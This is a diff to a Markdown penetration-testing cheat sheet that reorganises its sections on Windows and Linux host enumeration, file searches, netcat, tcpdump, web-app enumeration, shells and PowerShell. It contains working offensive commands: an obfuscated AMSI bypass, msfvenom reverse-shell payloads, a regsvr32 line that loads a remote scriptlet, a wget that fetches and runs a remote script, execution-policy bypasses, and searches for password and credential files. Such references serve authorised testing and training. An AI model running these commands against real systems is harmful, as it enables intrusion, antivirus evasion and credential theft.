@@ -92,12 +92,11 @@ Ping the target: `ping %IP%`\
 System information: `systeminfo`\
 Get Windows updates:`dism /online /get-packages`\
 Wmic get updates: `wmic qfe list full /format:htable > hotfixes.htm`\
-In PSH: `Get-WmiObject -Class "win32_quickfixengineering" | Select-Object -Property "Description", "HotfixID", @{Name="InstalledOn"; Expression={([DateTime]($_.InstalledOn)).ToLocalTime()}}`\
-Find files: `dir c: /S /OD /TC`\
-Find files PSH: `gci -filter * -recurse`
+In PSH: `Get-WmiObject -Class "win32_quickfixengineering" | Select-Object -Property "Description", "HotfixID", @{Name="InstalledOn"; Expression={([DateTime]($_.InstalledOn)).ToLocalTime()}}`
+
 
 ### Finding files/data:
-
+#### Linux
 Find UID 0 files root execution: `find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null`\
 Linux enum: `wget https://highon.coffee/downloads/linux-local-enum.sh; chmod +x ./linux-local-enum.sh; ./linux-local-enum.sh`\
 Find executable files updated in Jan: `find / -executable -type f 2> /dev/null | egrep -v "^/bin|^/var|^/etc|^/usr" | xargs ls -lh | grep Jan`\
@@ -114,6 +113,12 @@ Install steghide: `apt-get install steghide`\
 Extract data with steghide: `steghide extract -sf picture.jpg`\
 LSPst: `lspst filename.pst`\
 ReadPST: `readpst -DSr -o mailbox-export`
+
+#### Windows
+
+Find files PSH: `gci -filter * -recurse`\
+Find in files: `dir /s *username* == *password* == *cred* == *key* == *.txt*`\
+Find files recursively: `dir c: /S /OD /TC`
 
 ### Netcat/nc # nc.traditional or nc?
 
@@ -138,7 +143,7 @@ MAC address filter slicing: `eth.addr[0:3] == 00:50:56`\
 Negate traffic for this host: `!(ip.addr == 192.168.0.1)`\
 HTTP Post only traffic: `http.request.method == post`
 
-### Tcpdump:
+### TCPdump:
 
 Replay a pcap file: `tcpdump -r filename.pcap`\
 Grab a packet capture on port 80: `tcpdump  -i ens0 -xxNNSs 1514 -w output.pcap`
@@ -439,20 +444,24 @@ Notes: `-c: colours`\
 `-u: url or ip address in this case`\
 `-H: headers`
 
-### Sharepoint enum:
+### Application specific enumeration/exploit:
+
+#### Sharepoint enum:
 
 https://github.com/toddsiegel/spscan\
 https://github.com/0rigen/SharePwn
 
-### WordPress:
+#### WordPress:
 
 Wordpress scan: `WPScan -u http://10.10.10.59 --enumerate -u,t,at,ap --proxy 127.0.0.1:3129`
 
-### .git:
+#### .git:
 
 GiTtools: `https://github.com/internetwache/GitTools`\
 Dump git site: `./gitdumper.sh http://10.10.10.178/.git/ .git`\
 Extract: `./extractor.sh ../../.git ../../git-dest-dir`
+
+### Aliases:
 
 #### Python FTP:
 
@@ -531,7 +540,7 @@ Copy a directory from local to remote (-r recursive): `scp -r ~/userlist user@re
 Copy a directory from remote to local (-r recursive): `scp -r user@remote-host.com:~/revenge ~/userlist`\
 Copy from one ssh host to another ssh host (not yours): ` scp user@remote-host.com:~/users.txt user@another-remote-host.com:~/userlist`\
 
-## Shells
+## Shells and Payloads
 
 ### Web
 Webshells http://tools.kali.org/maintaining-access/webshells: `Kali webshells: /usr/share/webshells`
@@ -539,6 +548,11 @@ Weevely
 
 ### Executables
 Backdoor factory
+
+### Payloads - https://twitter.com/subTee/status/1157560782575419393 @Subtee
+"CLR via C# - Richter
+"Pro .NET Memory Mgmt" - Kokosa
+"High Performance .NET" - Watson
 
 ### Msfvenom
 Netcat ASP reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > reverse.asp`\
@@ -591,29 +605,7 @@ RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
 https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery
 Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
 
-## PowerShell
-Amsi bypass:
-```
-sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
-```
-Version 2: `PowerShell.exe -version 2`
-
-$cert = Get-ChildItem -Path “Cert:\CurrentUser\My” -CodeSigningCert
-
-Set-AuthenticodeSignature -FilePath “C:\Scripts\MyScript.ps1” -Certificate $cert
-
-Bypass EP
-PowerShell -ep bypass -file script.ps1
-Execute script contents directly
-Invoke-command with script block {} 
-Use stdin and GC: Get-Content .\file.ps1 | PowerShell.exe –NoProfile –Command -
-### Firewall rule:
-```
-New-NetFirewallRule -DisplayName "name" -RemoteAddress -Direction Outbound -Action Block -Enabled True
-New-NetFirewallRule -DisplayName "name" -Program program.exe -Direction Outbound -Action Block -Enabled True
-```
-
-## Host enum (probably detected)
+### Native CMD Host enum
 ```
 echo %userdomain%
 echo %logonserver%
@@ -630,22 +622,41 @@ $env
 Tree $home
 ```
 
-## WMIC:
+### WMIC Host enumeration:
 
 ```
+wmic startup
+wmic softwareelement
 wmic process list brief
 wmic group list brief
 wmic computersystem list
 wmic process list brief
 wmic ntdomain list brief
 wmic group list full /format:table
-mic user list full /format:table
+wmic user list full /format:table
 wmic sysaccount list full /format:table
 wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
 Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'" | ft
+wmic process call create "cmd.exe /c calc.exe"
 ```
 
+## PowerShell
+Amsi bypass:
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+Version 2: `PowerShell.exe -version 2`
+$cert = Get-ChildItem -Path “Cert:\CurrentUser\My” -CodeSigningCert
+Set-AuthenticodeSignature -FilePath “C:\Scripts\MyScript.ps1” -Certificate $cert
 
+Bypass EP
+PowerShell -ep bypass -file script.ps1
+Execute script contents directly
+Invoke-command with script block {} 
+Use stdin and GC: Get-Content .\file.ps1 | PowerShell.exe –NoProfile –Command -
 
-
-
+### Windows Firewall rule:
+```
+New-NetFirewallRule -DisplayName "name" -RemoteAddress -Direction Outbound -Action Block -Enabled True
+New-NetFirewallRule -DisplayName "name" -Program program.exe -Direction Outbound -Action Block -Enabled True
+```
